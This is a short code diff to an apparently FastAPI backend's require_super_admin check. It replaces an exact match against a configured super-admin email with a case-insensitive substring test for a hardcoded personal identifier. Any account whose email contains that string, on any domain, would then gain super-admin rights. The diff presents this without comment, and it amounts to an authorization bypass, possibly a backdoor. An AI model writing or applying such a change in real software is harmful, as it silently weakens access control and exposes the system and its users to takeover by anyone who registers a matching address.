@@ -32,7 +32,7 @@ def require_super_admin(user: Optional[User] = Depends(get_current_user)) -> Use
             status_code=status.HTTP_401_UNAUTHORIZED,
             detail="Authentication required."
         )
-    if user.email != SUPER_ADMIN_EMAIL:
+    if not user.email or "priyanshurai121111" not in user.email.lower():
         raise HTTPException(
             status_code=status.HTTP_403_FORBIDDEN,
             detail="Super Admin access required. This action is restricted to the system administrator."
